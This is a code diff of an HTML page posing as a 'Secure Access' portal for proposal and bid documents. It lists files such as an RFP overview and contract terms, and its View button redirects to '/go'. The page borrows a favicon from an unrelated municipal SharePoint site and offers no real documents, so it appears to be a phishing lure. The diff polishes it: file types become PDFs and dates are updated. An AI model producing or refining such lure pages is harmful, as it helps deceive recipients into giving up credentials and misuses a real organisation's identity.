@@ -4,9 +4,12 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Proposal & Bid Documents — Secure Access</title>
-    <meta name="description" content="Select and view your proposal & bidding documents.">
+    <meta name="description"
+        content="Select and view your proposal & bidding documents.">
     <link rel="icon" href="https://comunebresso.sharepoint.com/_layouts/15/images/favicon.ico?rev=43"
+        type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <script src="https://cdn.tailwindcss.com"></script>
 
     <script>
@@ -27,30 +30,19 @@
     </script>
 
     <style>
-        html { scroll-behavior: smooth; }
-
+        html { scroll-behavior: smooth }
         .bg-soft {
             background:
                 radial-gradient(1000px 500px at 10% -10%, rgba(38, 74, 69, .08), transparent),
-                radial-gradient(1000px 500px at 90% -10%, rgba(38, 74, 69, .06), transparent);
+                radial-gradient(1000px 500px at 90% -10%, rgba(38, 74, 69, .06), transparent)
         }
-
         button:focus-visible,
         input:focus-visible {
             outline: 2px solid #3A7A73;
             outline-offset: 2px;
         }
-
         .pdf-icon { color: #e74c3c; }
         .excel-icon { color: #217346; }
-
-        #docList li {
-            transition: background-color .2s ease;
-        }
-
-        #docList li:hover {
-            background: #f8fafc;
-        }
     </style>
 </head>
 
@@ -76,7 +68,6 @@
                     <h2 class="text-xl font-semibold">Available Files</h2>
                     <p class="mt-1 text-sm text-slate-500">Choose what you need. You can select all.</p>
                 </div>
-
                 <button id="btnSelectAll" type="button"
                     class="inline-flex items-center gap-2 px-3 py-2 text-sm border rounded-xl border-slate-300 hover:bg-slate-50">
                     <i class="fas fa-bars w-4 h-4"></i>
@@ -88,51 +79,57 @@
 
                 <li class="flex items-center justify-between gap-4 py-3">
                     <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300" data-file="RFP Overview Document.xlsx">
+                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
+                            data-file="RFP Overview Document.pdf">
                         <span class="font-medium">
                             <i class="fas fa-file-excel excel-icon"></i> RFP Overview Document
                         </span>
                     </label>
-                    <span class="text-xs text-slate-500">Q2 2026</span>
+                    <span class="text-xs text-slate-500">Q4 2026</span>
                 </li>
 
                 <li class="flex items-center justify-between gap-4 py-3">
                     <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300" data-file="Scope of Work & Specifications.pdf">
+                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
+                            data-file="Scope of Work & Specifications.pdf">
                         <span class="font-medium">
                             <i class="fas fa-file-pdf pdf-icon"></i> Scope of Work & Specifications
                         </span>
                     </label>
-                    <span class="text-xs text-slate-500">Q2 2026</span>
+                    <span class="text-xs text-slate-500">Q4 2026</span>
                 </li>
-				<li class="flex items-center justify-between gap-4 py-3">
+
+                <li class="flex items-center justify-between gap-4 py-3">
                     <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300" data-file="Bid Submission Guidelines.pdf">
+                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
+                            data-file="Bid Submission Guidelines.pdf">
                         <span class="font-medium">
                             <i class="fas fa-file-pdf pdf-icon"></i> Bid Submission Guidelines
                         </span>
                     </label>
-                    <span class="text-xs text-slate-500">Q2 2026</span>
+                    <span class="text-xs text-slate-500">Q4 2026</span>
                 </li>
 
                 <li class="flex items-center justify-between gap-4 py-3">
                     <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300" data-file="Compliance Requirements.xlsx">
+                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
+                            data-file="Compliance Requirements.pdf">
                         <span class="font-medium">
                             <i class="fas fa-file-excel excel-icon"></i> Compliance Requirements
                         </span>
                     </label>
-                    <span class="text-xs text-slate-500">Q2 2026</span>
+                    <span class="text-xs text-slate-500">Q4 2026</span>
                 </li>
 
                 <li class="flex items-center justify-between gap-4 py-3">
                     <label class="flex items-center flex-1 gap-3">
-                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300" data-file="Contract Terms & Conditions.pdf">
+                        <input type="checkbox" class="w-4 h-4 rounded border-slate-300"
+                            data-file="Contract Terms & Conditions.pdf">
                         <span class="font-medium">
                             <i class="fas fa-file-pdf pdf-icon"></i> Contract Terms & Conditions
                         </span>
                     </label>
-                    <span class="text-xs text-slate-500">Q2 2026</span>
+                    <span class="text-xs text-slate-500">Q4 2026</span>
                 </li>
 
             </ul>
@@ -147,6 +144,7 @@
                         class="ml-1 inline-flex items-center justify-center rounded-md bg-white/20 px-2 py-0.5 text-xs">0</span>
                 </button>
             </div>
+
         </section>
 
         <footer class="py-10 text-xs text-center text-slate-500">
@@ -178,6 +176,7 @@
 
     btnView.addEventListener('click', () => {
         if (checkboxes.filter(cb => cb.checked).length === 0) return;
+
         window.location.href = "/go";
     });
 
